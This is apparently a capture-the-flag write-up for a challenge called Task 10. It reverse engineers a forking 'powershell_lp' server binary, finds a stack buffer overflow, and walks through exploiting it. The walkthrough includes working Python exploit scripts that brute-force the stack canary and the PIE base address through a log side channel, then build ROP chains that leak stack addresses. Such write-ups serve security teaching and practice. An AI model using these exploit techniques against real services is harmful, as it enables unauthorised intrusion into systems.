# Task 10

Right up front, I just wanted to highlight that this is a fairly raw brain dump of my adventures in task 10.  There are certainly some things that could be way cleaner, and likely some points that I did not 100% understand.  If you see something that is wrong, please let me know!  Let's dig in!

For the final task, we need to gain access to the LP and discover the IP and port the `psuser` account transmitted data to.

## Obtaining the powershell LP binary
We can leverage the capabilities we built for [task 9](../task-9/README.md) to locate and download an ssh private key to enable ssh access to the LP.  After a bit of poking around, we can see there is a private key at `/home/lpuser/.ssh/id_rsa`.  

We can run the following commands using our `lpcomms` program to retrieve the file while capturing network traffic:

```
# check in
1e32dca0170000020002170800101b8cbd03d5e64265b5155556e875c7dde5008fd6

# list files in /home/lpuser/.ssh
1e32dca0170000020004170800101b8cbd03d5e64265b5155556e875c7dd171400122f686f6d652f6c70757365722f2e73736800e5008fd6

# download id_rsa from /home/lpuser/.ssh
1e32dca0170000020005170800101b8cbd03d5e64265b5155556e875c7dd171400122f686f6d652f6c70757365722f2e73736800171c000769645f72736100e5008fd6

# check out
1e32dca0170000020007e5008fd6
```

Now that we've captured the network traffic, we can parse the relevant data from the pcap and decrypt using our `cracker` program from [task 8](../task-8/README.md) to retrieve the key:

```bash
./cracker names.txt versions lp_response_data.pcap
...
Username: unknown
Time: 1636557906
Version: +1.2.0.0+
Key: 0e1d165647866e973f0b4140245b4d31941994ac580fc79b3d561cf07d0061ec
RAW:
2ܠ �-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA1+ftsBNamXUQP5VPqp+Du0BeKyjRqZaZmeJ7xE+hVwuRlB9k
nLHJzcO3FybNrlRgFsAsXhL+rqS3s1QJRF0JPALQASm7UjiCTRzb7TSSX6XhRFLh
...
```

Success!  Now we can simply ssh into the server for more robust access.  Once inside, we can poke around more and see that there is indeed a `psuser` home directory.  Within it, we see an interesting binary: `powershell_lp`, and what appear to be some associated logs: `ps_data.log`, `ps_server.log`, and `pslp.log`.  Let's grab each of these and retreat back to our own environment for some additional analysis.

## Analyzing powershell_lp
Initial exploration of `ps_server.log` indicates that it is tracking client connections.  `ps_data.log` seems to be a log of what data has been sent from the client connections.  Let's do some initial exploration of the `powershell_lp` binary:

```bash
$ file powershell_lp
powershell_lp: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, BuildID[sha1]=2d839ebf8fe71992878404be06a9f9ad655ec83b, stripped

$ checksec powershell_lp
[!] Did not find any GOT entries
[*] 'powershell_lp'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
$ ldd powershell_lp
        statically linked
```

So far, we can tell that the binary seems to be a stripped 64 bit elf, statically linked, and has some significant protections in place (full RELRO, NX, PIE).  It initially does not detect a canary, which is promising, however keep note of this.  Let's open it up in Ghidra and take a look around.

After loading up the binary and running the default analyzers on it, we have what at first glance seems to be a very daunting task ahead of us.  Because it is statically linked, we have very little clues into the functionality of the obscurely named functions before us.  We can at least start by trying to identify where the `main` function exists.  By jumping to the `entry` function, we get the following decompilation from Ghidra:

```c
void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 in_stack_00000000;
  undefined auStack8 [8];
  
  FUN_00109d50(FUN_00109a3e,in_stack_00000000,&stack0x00000008,FUN_0010a7c0,FUN_0010a860,param_3,
               auStack8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

This looks like a typical entry function you would find in most elf binaries, which is lucky, as we can just jump to the first argument to `FUN_00109d50` and there's a good chance that is `main`.  Double clicking `FUN_00109a3e` yields the following decompiled function:

```c
undefined8 FUN_00109a3e(int param_1,long param_2)

{
  undefined *puVar1;
  
  if (param_1 == 1) {
    puVar1 = &DAT_001bbd29;
  }
  else {
    puVar1 = *(undefined **)(param_2 + 8);
  }
  DAT_003e7010 = FUN_00156630("ps_server.log",0x442,0x1a4);
  DAT_003e7014 = FUN_00156630("ps_data.log",0x442,0x1a4);
  if ((DAT_003e7010 < 0) || (DAT_003e7014 < 0)) {
    FUN_00117ce0(1);
  }
  FUN_001097c0(puVar1);
  return 0;
}
```

We can see some readable strings which look primising.  There are some function calls which point at two of the logs we noted earlier.  Digging into those functions reveal a messy looking function that involves some syscalls.  We could either exhaust a good bit of effort trying to statically understand what these functions are doing, or we could take a quick shortcut.

DISCLAIMER: I do not advocate for running strange binaries on your system.  Proceed with caution and do so in a controlled sandbox environment!

We can utilize `strace` to run the lp and observe what syscalls are being executed:

```bash
$ strace ./powershell_lp
execve("./powershell_lp", ["./powershell_lp"], 0x7ffffceae950 /* 31 vars */) = 0
brk(NULL)                               = 0x55555562d000
brk(0x55555562e1c0)                     = 0x55555562e1c0
arch_prctl(ARCH_SET_FS, 0x55555562d880) = 0
uname({sysname="Linux", nodename="DESKTOP-V7A15AV", ...}) = 0
readlink("/proc/self/exe", "..."..., 4096) = 64
brk(0x55555564f1c0)                     = 0x55555564f1c0
brk(0x555555650000)                     = 0x555555650000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "ps_server.log", O_RDWR|O_CREAT|O_APPEND, 0644) = 3
openat(AT_FDCWD, "ps_data.log", O_RDWR|O_CREAT|O_APPEND, 0644) = 4
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0), ...}) = 0
write(1, "Server started \33[92mport 8080\33[0"..., 34Server started port 8080
) = 34
mmap(NULL, 800, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0) = 0x7f77967e1000
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 5
setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(5, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(5, 10)                           = 0
rt_sigaction(SIGCHLD, {sa_handler=0x7f77965083fa, sa_mask=[CHLD], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f7796515c20}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
accept(5,
```

After the first several lines, we see our two syscalls which reference the log files.  They appear to be `openat` calls, which a quick man page review indicates that the program is opening the log files for read/write/append with `-rw-r--r--` permissions - presumably to log relevant information as the server processes requests.

We can also see some additional interesting syscalls:  `write` which displays text indicating the server has started, and a series of `socket` related calls to bind the server and prepare for incoming connections.  With what we know, we can start updating our Ghidra decompilation and assigning labels to functions we have identified.  I highly recommending you do this as you go to help make sense of the program as you work.

Moving on in Ghidra, we can see the function `FUN_001097c0` seems to contain the meat and potatoes for the server:

```c
void FUN_001097c0(undefined8 param_1)

{
  undefined4 *puVar1;
  long lVar2;
  undefined2 uVar3;
  undefined4 uVar4;
  undefined8 uVar5;
  long in_FS_OFFSET;
  undefined4 local_4c;
  int local_48;
  int local_44;
  undefined4 local_40;
  int local_3c;
  undefined local_38 [24];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0;
  FUN_001198e0("Server started %sport %s%s\n",&DAT_001bbcd9,param_1,&DAT_001bbcd4);
  DAT_003e93c8 = FUN_00157540(0,800,3,0x21,0xffffffff,0);
  if (DAT_003e93c8 == -1) {
LAB_00109a23:
    if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
      return;
    }
                    /* WARNING: Subroutine does not return */
    FUN_001593b0();
  }
  for (local_44 = 0; local_44 < 100; local_44 = local_44 + 1) {
    *(undefined4 *)(DAT_003e93c8 + (long)local_44 * 8) = 0xffffffff;
    *(undefined4 *)(DAT_003e93c8 + (long)local_44 * 8 + 4) = 0xffffffff;
  }
  local_40 = FUN_00109554(param_1);
  FUN_00116ad0(0x11,FUN_001093fa);
  do {
    if ((local_48 < 0) || (99 < local_48)) goto LAB_00109a23;
    local_4c = 0x10;
    puVar1 = (undefined4 *)(DAT_003e93c8 + (long)local_48 * 8);
    uVar4 = FUN_00158d90(local_40,local_38,&local_4c);
    *puVar1 = uVar4;
    if (*(int *)(DAT_003e93c8 + (long)local_48 * 8) < 0) {
      FUN_00117ce0();
    }
    local_3c = FUN_00155c90();
    if (local_3c == 0) {
      lVar2 = DAT_003e93c8 + (long)local_48 * 8;
      uVar4 = FUN_00156010();
      *(undefined4 *)(lVar2 + 4) = uVar4;
      FUN_00156b90(local_40);
      FUN_00109669(local_38,local_48);
      FUN_00156b90(*(undefined4 *)(DAT_003e93c8 + (long)local_48 * 8));
      FUN_00117ce0();
    }
    uVar3 = FUN_00159460();
    uVar5 = FUN_00159470();
    FUN_00119b10(DAT_003e7010,"Child %d handling connection from %s:%u\n",local_3c,uVar5,uVar3);
    FUN_00156b90();
    local_48 = -1;
    for (local_44 = 0; local_44 < 100; local_44 = local_44 + 1) {
      if (*(int *)(DAT_003e93c8 + (long)local_44 * 8) == -1) {
        local_48 = local_44;
        break;
      }
    }
  } while( true );
}
```

A few observations:
1. We can see a plaintext string that display the server start message, and another for handling a connection - interestingly referencing a child.
2. There is a `do while` loop with a static `true` condition (potentially where new connections are handled?)
3. the line `local_20 = *(long *)(in_FS_OFFSET + 0x28);` looks suspiciously like a stack canary being initialized.  Perhaps this binary does indeed have canary protections.

From here, we have a decent amount of information at our disposal.  To discover the rest of the LP functionality, the process is mostly the same:
1. Iterate through functions as you come across them
2. Attempt to identify if the function is a libc (or other linked library) function
    1. If so, identify what it could be through evaluation of relevant syscalls
    2. If not, start back at step 1 within the new function
3. Label instructions as you go

After a somewhat grueling process, we get to a point where we can reason well about the flow of the program.  The LP will accept client connections, and fork to a new process for each one.  It is expecting what looks like an HTTP request with a `Content-Length` header (in actuality, all that matters is that there is a `Content-Length` header and a header termination of `\r\n\r\n` - there are no other HTTP requirements expected).  The value of the `Content-Length` header will be used to read up to `0x1000` bytes into a `0x1000` byte buffer. The server will echo the received data back to the client, and then log the data received in the `ps_data.log` file.  Finally, as the fork finishes execution, the status of the child process will be logged in `ps_server.log` to include exit code. 
## Identifying the vulnerability
A particularly interesting function exists at `0x00108f6b` (assuming a default program start address of `0x100000`):

```c
uint receiveAllBytes(undefined4 socket,long buf,uint length)

{
  undefined4 *puVar1;
  long bytes_received;
  int *piVar2;
  uint total_received;
  
  total_received = 0;
  do {
    while( true ) {
      if (length <= total_received) {
        return total_received;
      }
      puVar1 = (undefined4 *)FUN_0010a8b0();
      *puVar1 = 0;
      bytes_received = recvfrom(socket,(ulong)total_received + buf,length,0);
      if (bytes_received < 1) break;
      total_received = total_received + (int)bytes_received;
    }
    piVar2 = (int *)FUN_0010a8b0();
  } while (*piVar2 == 4);
  return total_received;
}
```

Using the `length` received from the `Content-Length` header previously, this function will iteratively receive from the open socket up to the `length` number of bytes into a `0x1000` byte buffer until at receives `length` bytes (or more).  Here is where the vulnerability lies.  We can see that the `recvfrom` call is always accepting up to `length` bytes to put into the buffer.  If we craft an exploit that will send at least two payloads, we can potentially overflow the `0x1000` byte buffer.  Here's how:

Let's say for the first iteration, we send the following payload:

```
Content-Length: 4096\r\n\r\n[... 3840 "a" characters ...]
```

After sending this, the `4096` byte buffer would be filled with `3840` bytes (all "a"s).  Because we told the LP that it should be expecting `4096` bytes, the loop will go through another iteration.  If we send it another payload that looks like this:

```
[... 300 "b" characters ...]
```

our `4096` byte buffer would be overflowed with `4140` bytes.  Let's validate this by running a small proof of overflow script against our running LP:

```python
from pwn import *

if __name__ == '__main__':
    payload1 = "Content-Length: 4096\r\n\r\n{}".format('a' * 3840).encode()
    payload2 = ('b' * 300).encode()

    p = remote("localhost", 8080)

    p.send(payload1)
    time.sleep(0.15)

    p.send(payload2)
    p.recvuntil(b"\r\n\r\n").decode()
    r = p.recvall()
    p.close()
```

Executing the script yields some interesting results.  `ps_server.log` has the following new entry:

```bash
Child 12821 handling connection from 127.0.0.1:39710
Child 12821 exited due to signal 6
```

And from the LP stderr, we see the following:

```bash
$ ./powershell_lp
Server started port 8080
*** stack smashing detected ***: <unknown> terminated
```

Looking back at Ghidra, we can see where this failure is likely occurring.  The function that calls `receiveAllBytes` (the function at `0x109684`) has a stack canary check, which overflowing our buffer likely triggered:

```c
void receiveDataFromClient(long param_1,int param_2)

{
  undefined2 clientPort;
  uint contentLength;
  uint length;
  undefined4 bufLen;
  undefined8 clientIp;
  long lVar1;
  undefined8 *puVar2;
  long in_FS_OFFSET;
  undefined8 buf [513];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puVar2 = buf;
  for (lVar1 = 0x200; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  contentLength = getMessageLength(*(undefined4 *)(pMmap + (long)param_2 * 8));
  if (contentLength != 0) {
    length = 0x1000;
    if (contentLength < 0x1001) {
      length = contentLength;
    }
    bufLen = receiveAllBytes(*(undefined4 *)(pMmap + (long)param_2 * 8),buf,length);
    sendResponse(*(undefined4 *)(pMmap + (long)param_2 * 8),buf,bufLen);
    clientPort = getClientPort(*(undefined2 *)(param_1 + 2));
    clientIp = getClientIp(*(undefined4 *)(param_1 + 4));
    writeToDataLog(clientIp,clientPort,buf,bufLen);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    stack_smashing_check();
  }
  return;
}
```

Specifically, pay attention to the call to `receiveAllBytes` where we pass our buffer in, and the if statement just before the return where it checks the value of the canary.  To confirm this suspicion, we can move to dynamic analysis using gdb (I am using [pwndbg](https://github.com/pwndbg/pwndbg) as well).

Let's load up our LP in gdb and start it:

```bash
gdb ./powershell_lp
pwndbg> start
```

As a first step, let's align our address space with what we see in Ghidra:

```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7ffff7d13000     0x7ffff7df7000 r-xp    e4000 0      /home/test/workspace/codebreaker/lpcomms/exfil/powershell_lp
    0x7ffff7ff1000     0x7ffff7ff5000 r--p     4000 0      [vvar]
    0x7ffff7ff5000     0x7ffff7ff6000 r-xp     1000 0      [vdso]
    0x7ffff7ff6000     0x7ffff7ffd000 rw-p     7000 e3000  /home/test/workspace/codebreaker/lpcomms/exfil/powershell_lp
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000 0      [heap]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
```

We are interested in the very first entry of `0x7ffff7d13000`.  In Ghidra, select `Window -> Memory Map`, then click the `Home` icon in the top right.  Paste the value into the prompt and hit ok.  Your addresses should now match what we see in gdb.  We will want to set a couple breakpoints in gdb.  First, let's break just before our call to `receiveAllBytes` to see what the stack looks like before we attempt to alter it.  This call occurs at `0x7ffff7d1c71a`.  Next, we will want to set a breakpoint where the program determines if the canary has been overwritten.  This is at `0x7ffff7d1c7ad`.

Back in gdb:

```bash
pwndbg> br *0x7ffff7d1c71a
Breakpoint 3 at 0x7ffff7d1c71a
pwndbg> br *0x7ffff7d1c7ad
Breakpoint 4 at 0x7ffff7d1c7a
pwndbg> c
Continuing.
Server started port 8080
```

We are ready to send our payload by running our proof of overflow script again.  Once the script runs, we should hit our first breakpoint.

Using pwndbg, let's take a look at the stack just before we execute the call to `receiveAllBytes`:

```bash
pwndbg> telescope $rsp+0x1000 10
00:0000│     0x7fffffffe020 ◂— 0x0
... ↓        3 skipped
04:0020│     0x7fffffffe040 —▸ 0x7ffff7ff0000 ◂— 0x48aa00000006
05:0028│     0x7fffffffe048 ◂— 0x3f079edd438f5800
06:0030│     0x7fffffffe050 —▸ 0x7ffff7ff0000 ◂— 0x48aa00000006
07:0038│     0x7fffffffe058 —▸ 0x7ffff7d1d860 ◂— push   rbp
08:0040│ rbp 0x7fffffffe060 —▸ 0x7fffffffe0d0 —▸ 0x7fffffffe100 —▸ 0x7ffff7d1d7c0 ◂— push   r15
09:0048│     0x7fffffffe068 —▸ 0x7ffff7d1c95f ◂— mov    rax, qword ptr [rip + 0x2dfa62]
```

Because we know that there is a `0x1000` byte buffer on the stack, I just want to look at what's past that, so I telescope 0x1000 bytes past the stack pointer, and see some interesting stuff.  Starting at the bottom, just afer `rbp` we see what should be the return address for when this function returns.  a few lines above at `0x7fffffffe048`, we see an interesting value: `0x3f079edd438f5800`.  Let's dig into this a bit more.

Based on our observations in Ghidra, we know the canary is likely stored at an offset from fs (specifically +0x28).  pwndbg has a handy way of exploring this area:

```bash
pwndbg> fsbase
0x7ffff7fff880
pwndbg> telescope 0x7ffff7fff880+0x28
00:0000│     0x7ffff7fff8a8 ◂— 0x3f079edd438f5800
```

Here we see the value that we noticed on the stack earlier.  This is most definitely our canary value.  Let's step over the call to `receiveAllBytes` and see what happens.

```bash
pwndbg> telescope $rsp+0x1000 10
00:0000│     0x7fffffffe020 ◂— 0x6262626262626262 ('bbbbbbbb')
... ↓        8 skipped
09:0048│     0x7fffffffe068 ◂— 0x7fff62626262
```

Here we see that the location that once held our canary has now been obliterated by `b` characters - and more interestingly, so has the return address we noted earlier.  If we continue execution to where the program checks the canary value, we will see that it does not jump over the stack fail function, and thus we end up with our stack smashing message and signal 6.

We have now verified we have the ability to overflow our buffer - now we need to focus on how we can exploit this vulnerability.

## Crafting the exploit
Let's start by thinking for a moment of what our approach will be for this exploit chain.  We know the following relevant information:
1. We have a buffer overflow vulnerability which will allow us to overwrite a return address on the stack.
2. There is a stack canary we will need to contend with before overwriting the return address
3. The stack is non-executable, so we can't use shellcode and will need to leverage ROP techniques (at least initially)
4. Due to ASLR/PIE, we won't know the base address of the .text section, so we'll need to leak some additional information to support a ROP chain

### Contending with the canary
As we demonstrated earlier in our gdb walkthrough, simply overflowing the buffer to control the return address is not going to cut it.  We need to bypass the stack canary first.  As noted earlier, each time the LP accepts a new client connection, it forks a child process.  When a process [forks](https://en.wikipedia.org/wiki/Fork_(system_call)#:~:text=The%20fork%20operation%20creates%20a,segments%20of%20the%20parent%20process.&text=Instead%2C%20virtual%20memory%20pages%20in,page%3A%20then%20it%20is%20copied.), the child gets an exact copy of the parent process's memory segments.  This means that the child should also get the same canary value.  This opens up the option of brute forcing the canary.  If you run the program in gdb a handful of times, you'll notice that the canary always starts with a null byte (keep in mind the gdb output from above is showing little endian, so the last byte shown is really the first)  This leaves us 7 bytes to bruteforce with a search space of `256 * 7` - very doable.

For our bruteforce approach, we are going to need some sort of feedback mechanism, so we know when we guessed correctly.  If you recall, we noted that one of our logs was tracking the exit status of the child processes, and that when we clobbered the canary in our proof of overflow, it exited with signal 6.  A successful child should instead exit with status 0.  We can use that as our indicator.  Remember, at this point, we are working on a local copy of the LP, but we will eventually need to do this on the remote version, but since we have SSH access to the LP, and they enable read access for other-than-owner-and-group users, we should still be good to go - let's keep this in mind and bake in the SSH portions as we go.

After playing around a bit more in gdb and modifying the proof of exploit, I was able to determine that we can begin to overflow the canary after sending `4104` bytes, and we know that the next byte should be a null.  From there we can begin our bruteforce attempt:


NOTE: pwntools can get noisy, so if you want to disable the normal output, add `PWNLIB_SILENT=1` as an environment variable.
```python
from pwn import *
import time
import paramiko
import binascii

if __name__ == '__main__':
    server = "localhost"
    username = "test"
    password = "test"
    server_log = "ps_server.log"

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(server, username=username, password=password)

    canary = b'\x00'

    while len(canary) != 8:
        failed = True
        for i in range(256):
            payload1 = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
            payload2 = b'\x00' * 264 + canary + bytes([i])

            p = remote(server, 8080)

            p.send(payload1)

            # If we don't sleep here, all the data will be sent at once and the server will receive over 0x1000 bytes in
            # on go (which we don't want!)
            time.sleep(0.15)

            p.send(payload2)
            p.recvuntil(b"\r\n\r\n").decode()
            r = p.recvall()
            p.close()

            time.sleep(0.15)

            # read the child exit status from the remote log
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("tail -n 1 {}".format(server_log))
            result = ssh_stdout.readline()

            # If we have a successful byte, print the result and move to the next byte
            if "status 0" in result:
                canary += bytes([i])
                print(binascii.hexlify(canary).decode())
                failed = False
                break

        # Just in case we have a race condition with writing to the log file, we need to detect if we got through a
        # byte without finding its value so we can rewind and try again
        if failed:
            print("oh no!")
            canary = canary[:-1]

    # Behold... our canary
    print("canary: {}".format(hex(u64(canary))))
```

After a few minutes, we have our canary value:

```bash
0026
00267f
00267f7f
00267f7f0d
00267f7f0df4
00267f7f0df490
00267f7f0df4903e
canary: 0x3e90f40d7f7f2600
```

### Identifying the .text base address

Now that we have a way to bypass the canary, we can look at overwriting the return address to force our own execution path.  If you recall, we have a non-executable stack, so ROP techniques look like a good way to go right now.  Using a tool such as [ropper](https://github.com/sashs/Ropper), we can see that we have quite a large pool of potential ROP gadgets (21435 gadets to be exact - thanks, static linking!):

```bash
$ ropper -f powershell_lp --nocolor > rops
$ tail rops
0x0000000000017beb: xor rdx, qword ptr [0x30]; mov rdi, qword ptr [rax + 0x20]; call rdx;
0x0000000000019a34: xor rdx, qword ptr fs:[0x28]; jne 0x19a47; add rsp, 0xd8; ret;
0x000000000005656e: xor rdx, qword ptr fs:[0x28]; jne 0x56589; add rsp, 0x28; ret;
0x000000000005749d: xor rdx, qword ptr fs:[0x28]; jne 0x574b7; add rsp, 0x28; ret;
0x000000000009cf54: xor rdx, qword ptr fs:[0x28]; jne 0x9cf64; add rsp, 0x38; ret;
0x000000000009d037: xor rdx, qword ptr fs:[0x28]; jne 0x9d054; add rsp, 0x38; ret;
0x0000000000017afe: xor rdx, qword ptr fs:[0x30]; call rdx;
0x0000000000017bea: xor rdx, qword ptr fs:[0x30]; mov rdi, qword ptr [rax + 0x20]; call rdx;

21435 gadgets found
```

An initial glance, however, reminds us that this binary has PIE, RELRO, and ASLR to contend with, so instead of exact addresses for the ROP gadgets, we are only getting offsets from the base address (which we don't know - yet).  We can take another bruteforce approach (`256 * 8`) to get a good guestimate of what our base address is by reusing our same process for the canary and focusing instead on the return address.  In theory, we should be able to see a SEGFAULT (signal 11) exit status if we don't get a good address, and a status 0 otherwise.

I won't rehash the code again, as it is almost the same as above, but the full exploit is available for review [here](exploit.py).

Running our code again yields now the Canary AND a potential good return address:

```bash
0026
00267f
00267f7f
00267f7f0d
00267f7f0df4
00267f7f0df480
oh no!  # <--- SEE? This is why we add the failure checking!
00267f7f0df490
00267f7f0df4903e
canary: 0x3e90f40d7f7f2600
75
751c
oh no! # < oof - again!
75e9
75e9a1
75e9a1b1
75e9a1b115
75e9a1b1157f
75e9a1b1157f00
75e9a1b1157f0000
good return: 0x7f15b1a1e975
```

We now have a return value that results in a clean exit.  In order to determine the base, we can observe that the base typically looks something like this every time we boot it up: `0x7f15b1a1e000`.  Of note, the high nibble on the second least significant bit, and the low nibble on the third least significant bit seem to be the variable here.  We can brute force the byte that makes up these combined nibbles with a search space of `256`.  

In order to bruteforce this portion, we will need our ROP gadget offsets.  The general idea is that for each byte in the range `0-256`, we will attempt to execute a ROP chain that will simply call exit with an exit code of 0.  If we land on the right byte, our base address should be correct, and the ROP gadget offsets should point to the correct locations in memory, therefore we should properly call exit.  Otherwise, we should see some SEGFAULT action again.

For the ROP chain itself, we will want to execute a [syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) for exit, which needs `60` in `RAX`, and `0` in `RDI`, so we'll need gadgets to populate the registers, as well as execute the syscall:

```bash
0x000000000000877f: pop rax; ret;
0x0000000000008876: pop rdi; ret;
0x0000000000052a25: syscall; ret;
```

These three will do nicely.

```python
 base = hex(u64(good_return))[2:9]

 for i in range(0xff):
     newbase = int((base + ("%02x" % i) + "000"), 16)

     POP_RAX_RET = newbase + 0x000000000000877f
     POP_RDI_RET = newbase + 0x0000000000008876
     SYSCALL_RET = newbase + 0x0000000000052a25

     payload1 = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
     payload2 = cyclic(264) + canary + (b'\x00' * 24)

     payload2 += p64(POP_RAX_RET)
     payload2 += p64(60)
     payload2 += p64(POP_RDI_RET)
     payload2 += p64(0)
     payload2 += p64(SYSCALL_RET)
     payload2 += good_return

     p = remote(server, 8080)
     p.send(payload1)
     time.sleep(0.1)
     p.send(payload2)
     p.recvuntil(b"\r\n\r\n").decode()
     r = p.recvall()
     p.close()

     ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("tail -n 1 {}".format(server_log))
     result = ssh_stdout.readline()
     if "status 0" in result:
         print("base: {}".format(hex(newbase)))
         break
```

Running the above addition now provides us with our canary, a good return, and the derived base address:

```bash
0026
00267f
00267f7f
00267f7f0d
00267f7f0df4
00267f7f0df490
00267f7f0df4903e
canary: 0x3e90f40d7f7f2600
75
75e9
75e9a1
75e9a1b1
75e9a1b115
75e9a1b1157f
75e9a1b1157f00
75e9a1b1157f0000
good return: 0x7f15b1a1e975
base: 0x7f15b1a0d000
```

Knowing our base and having demonstrated a successful simple ROP chain to call exit, we should now be able to do something more robust.  There are many approaches we could take from here.  I chose to attempt to modify the non-executable stack to instead be executable.  From there, we can put shellcode on the stack, and find a ROP gadget to jump to our shellcode.

### But where is the stack?

First, we need to know where the stack is in address space.  We know the canary, we know the .text section base address, but we do not net know where the stack is.  There is nothing immediately evident we can target for a brute force approach, but if you recall earlier in our analysis of the LP binary, we do have some open file descriptors that we may be able to leverage here.  If we can find a way to write some data from the stack into one of these files, we may be able to leak a stack address.

To do this, let's use a `write` syscall.  We will need a couple more ROP gadgets:

```bash
0x000000000001cca2: pop rdx; ret;
0x000000000008f4fc: mov rbx, rsp; mov rsi, rbx; syscall;
```

With our original gadgets, we have a way of populating `RAX` for the syscall number, and `RDI` for the first argument.  These two additional gadgets give us the ability to populate `RDX` for the third argument, and place a pointer to the stack into `RSI` for the second argument.  The plan is to make a `write` call that looks like this:

```c
write(4, stack_pointer, 0xff);
```

By passing 4 as the first argument, we are guessing that file descriptor 4 is pointing at one of our log files into which we will write `0xff` bytes from the stack.  Here's what our code looks like:

```python
 payload1 = "Content-Length: 4096\r\n\r\n{}".format('\x00' * 0xf00).encode()
 payload2 = cyclic(264) + canary + (b'\x00' * 24)

 payload2 += p64(POP_RAX_RET)
 payload2 += p64(1)
 payload2 += p64(POP_RDI_RET)
 payload2 += p64(4)
 payload2 += p64(POP_RDX_RET)
 payload2 += p64(0xff)
 payload2 += p64(MOV_RBX_RSP_MOV_RSI_RBX_SYSCALL)

 p = remote(server, 8080)
 p.send(payload1)
 time.sleep(0.1)
 p.send(payload2)
 p.recvuntil(b"\r\n\r\n").decode()
 r = p.recvall()
 p.close()

 time.sleep(3)
 ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("hexdump -C {}".format(data_log))
 print(ssh_stdout.read().decode()[-4096:])
```

After the write call, we can use our SSH ability to hexdump the log files and manually examine the content.  Looking at `ps_data.log`, we get the following dump:

```bash
026590a0  00 00 00 00 00 00 00 00  00 00 00 00 61 61 61 61  |............aaaa|
026590b0  62 61 61 61 63 61 61 61  64 61 61 61 65 61 61 61  |baaacaaadaaaeaaa|
026590c0  66 61 61 61 67 61 61 61  68 61 61 61 69 61 61 61  |faaagaaahaaaiaaa|
026590d0  6a 61 61 61 6b 61 61 61  6c 61 61 61 6d 61 61 61  |jaaakaaalaaamaaa|
026590e0  6e 61 61 61 6f 61 61 61  70 61 61 61 71 61 61 61  |naaaoaaapaaaqaaa|
026590f0  72 61 61 61 73 61 61 61  74 61 61 61 75 61 61 61  |raaasaaataaauaaa|
02659100  76 61 61 61 77 61 61 61  78 61 61 61 79 61 61 61  |vaaawaaaxaaayaaa|
02659110  7a 61 61 62 62 61 61 62  63 61 61 62 64 61 61 62  |zaabbaabcaabdaab|
02659120  65 61 61 62 66 61 61 62  67 61 61 62 68 61 61 62  |eaabfaabgaabhaab|
02659130  69 61 61 62 6a 61 61 62  6b 61 61 62 6c 61 61 62  |iaabjaabkaablaab|
02659140  6d 61 61 62 6e 61 61 62  6f 61 61 62 70 61 61 62  |maabnaaboaabpaab|
02659150  71 61 61 62 72 61 61 62  73 61 61 62 74 61 61 62  |qaabraabsaabtaab|
02659160  75 61 61 62 76 61 61 62  77 61 61 62 78 61 61 62  |uaabvaabwaabxaab|
02659170  79 61 61 62 7a 61 61 63  62 61 61 63 63 61 61 63  |yaabzaacbaaccaac|
02659180  64 61 61 63 65 61 61 63  66 61 61 63 67 61 61 63  |daaceaacfaacgaac|
02659190  68 61 61 63 69 61 61 63  6a 61 61 63 6b 61 61 63  |haaciaacjaackaac|
026591a0  6c 61 61 63 6d 61 61 63  6e 61 61 63 6f 61 61 63  |laacmaacnaacoaac|
026591b0  70 61 61 63 00 26 7f 7f  0d f4 90 3e 00 00 00 00  |paac.&.....>....|
026591c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
026591d0  00 00 00 00 7f d7 a1 b1  15 7f 00 00 01 00 00 00  |................|
026591e0  00 00 00 00 76 d8 a1 b1  15 7f 00 00 04 00 00 00  |....v...........|
026591f0  00 00 00 00 a2 1c a3 b1  15 7f 00 00 ff 00 00 00  |................|
02659200  00 00 00 00 fc 44 aa b1  15 7f 00 00 02 00 8c 66  |.....D.........f|
02659210  7f 00 00 01 00 00 00 00  00 00 00 00 a4 01 00 00  |................|
02659220  00 00 00 00 00 26 7f 7f  0d f4 90 3e 40 8e cf b1  |.....&.....>@...|
02659230  15 7f 00 00 b8 d3 a1 b1  15 7f 00 00 50 8d c1 78  |............P..x|
02659240  fd 7f 00 00 d4 ea a1 b1  15 7f 00 00 78 8e c1 78  |............x..x|
02659250  fd 7f 00 00 60 f8 a1 b1  01 00 00 00 00 00 00 00  |....`...........|
02659260  00 00 00 00 29 0d ad b1  15 7f 00 00 c0 f7 a1 b1  |....)...........|
